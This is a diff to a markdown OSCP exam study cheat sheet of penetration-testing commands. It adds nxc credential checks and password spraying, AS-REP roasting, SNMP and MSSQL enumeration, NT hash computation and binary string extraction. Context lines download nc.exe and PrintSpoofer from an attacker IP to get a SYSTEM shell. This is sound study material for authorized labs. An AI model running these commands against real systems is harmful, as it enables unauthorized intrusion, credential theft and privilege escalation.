@@ -2,6 +2,8 @@
 
 #### VPN
 
+https://10.70.70.70/cpanel/exam.php?md=722671a859a60b8b90a19c04093cc2cb&pid=1166907
+
 Connect to OffSec labs
 
 ```sh
@@ -29,7 +31,7 @@ Baseline commands to run against every box, regardless of findings so far.
 
 #### General
 
-Methodology mindmap: https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg
+Methodology mindmap: https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
 
 ```sh
 # Full port scan (don't rely on top-1000)
@@ -99,6 +101,9 @@ Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorActio
 # Box 3: Lateral movement without exploit (creds, reuse, abuse), requires AD privilege escalation
 
 # Run as soon as any domain credential (even low-priv) is obtained
+nxc smb IP -u 'USER' -p 'PASS'
+nxc smb IP -u 'USER' -p 'PASS' --local-auth
+nxc winrm IP -u 'USER' -p 'PASS'
 nxc smb IP -u 'USER' -p 'PASS' --shares
 nxc smb IP -u 'USER' -p 'PASS' --users
 nxc smb IP -u 'USER' -p 'PASS' --groups
@@ -128,7 +133,7 @@ nxc smb IP -u users.txt -H hashes.txt --continue-on-success
 # SMB - single known valid cred/hash against full user list
 nxc smb IP -u users.txt -p '<known_password>' --continue-on-success
 nxc smb IP -u users.txt -H '<known_hash>' --continue-on-success
-# WinRM - password spray 
+# WinRM - password spray (also try if smb didn't work)
 nxc winrm IP -u users.txt -p passwords.txt
 nxc winrm IP -u users.txt -p passwords.txt --local-auth     
 # WinRM - hash spray 
@@ -210,6 +215,8 @@ ls /usr/share/nmap/scripts/ | grep TERM
 
 #### Nuclei
 
+Not allowed on OSCP exam!
+
 ```sh
 nuclei -target https://example.com
 ```
@@ -251,6 +258,8 @@ searchsploit -m 42031
 
 ##### Metasploit
 
+Only allowed once on OSCP exam!
+
 ``` sh
 msfconsole
 # Open HTML file with module information
@@ -268,6 +277,8 @@ info -d
 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) 
 
 ##### sqlmap
+
+Not allowed on OSCP exam!
 
 ```sh
 # sqlmap
@@ -433,6 +444,7 @@ env
 set
 ps aux | cat
 ls -la /home
+lsblk
 
 # Enumerate packages and kernel modules for vulnerabilities
 dpkg -l
@@ -636,6 +648,10 @@ Get-LocalGroupMember GROUPNAME
 
 # System info
 systeminfo
+# Environment variables
+set
+# Disks
+fsutil fsinfo drives
 # Always look in any specific service folders related to the challenge
 ../*config*
 ../*users*
@@ -831,6 +847,8 @@ certutil -urlcache -split -f http://192.168.45.235/nc.exe
 # PrintSpoofer
 iwr -uri http://IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 .\PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
+
+# SigmaPotato
 
 # Mimikatz
 # https://adsecurity.org/?page_id=1821
@@ -1033,6 +1051,7 @@ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 # Check users without pre-auth
 Get-DomainUser -PreauthNotRequired
 impacket-GetNPUsers -dc-ip IP -request -outputfile hashes.asreproast DOMAIN/USER
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip IP -no-pass
 
 # From Linux/Windows using Impacket/Rubeus
 # https://github.com/GhostPack/Rubeus
@@ -1394,6 +1413,7 @@ ls
 ##### Brute Force
 
 https://github.com/ropnop/kerbrute
+https://hackviser.com/tactics/tools/kerbrute
 
 ``` sh
 # Enumerate users
@@ -1624,16 +1644,22 @@ snmpwalk -c public -v1 -t 10 IP -Oa
 
 # Enumerate Windows users on dc
 snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25
-
 # Enumerate running processes
 snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
 sudo nmap -sU -p 161 --script=snmp-processes <target>
-
 # Enumerate installed software
 snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
-
 # Enumerate TCP listening ports
 snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
+# Enumerate NET-SNMP-EXTEND-MIB
+snmpwalk -c public -v1 IP .1.3.6.1.4.1.8072.1.3.2
+```
+
+##### snmp-check
+
+``` sh
+# Automatically enumerates per category
+snmp-check -c public IP -v 2c
 ```
 
 #### LDAP (TCP: 389/636)
@@ -1728,7 +1754,7 @@ nxc rdp IP -u 'USER' -p 'PASS' --nla
 
 ``` sh
 # xfreerdp3
-xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
+xfreerdp3 /u:USER /p:PASS /v:IP /dynamic-resolution
 # rdesktop (no auth needed)
 rdesktop IP
 ```
@@ -1781,9 +1807,19 @@ Enter-PSSession 1
 
 ##### MSSQL (TCP: 1433)
 
+https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html
+
 ```sh
 # MSSQL login
 impacket-mssqlclient USER:PASS@IP -windows-auth
+
+# User enum
+SELECT SYSTEM_USER;
+SELECT USER_NAME();
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT IS_SRVROLEMEMBER('serveradmin');
+SELECT IS_SRVROLEMEMBER('securityadmin');
+SELECT IS_SRVROLEMEMBER('db_owner');
 
 # Check version
 SELECT @@version;
@@ -2208,6 +2244,10 @@ git show COMMIT_ID
 # Windows
 # Add user to local Administrators group
 net localgroup Administrators USER /add
+
+# Compute NT hash
+iconv -f ascii -t utf16le <(printf 'PASSWORD') | openssl dgst -md4
+
 ```
 
 #### Windows File Upload Methods
@@ -2271,6 +2311,35 @@ sudo responder -I tun0 -wv
 http://TARGET/?url=http://KALI_IP:80/
 # Captured Net-NTLMv2 hash appears in Responder output; crack it
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+##### Binary Analysis
+
+``` sh
+# Analyze custom binaries for passwords, secrets, etc
+# Especially interesting when .pdb path is included
+
+# Metadata
+file binary
+rabin2 -I binary
+
+# Try strings different encodings
+# Extract UTF-16 little-endian
+strings -a -el binary
+# Extract UTF-16 big-endian
+strings -a -eb binary
+# Extract 7-bit ASCII
+strings -a -e s binary
+# Extract 16-bit big-endian
+strings -a -e b binary
+# Extract 16-bit little-endian
+strings -a -e l binary
+
+# Dump binary 
+# Headers, metadata
+objdump -x binary
+# Disassemble .text
+objdump -d binary
 ```
 
 #### OSCP Exam Report Checklist (per box)
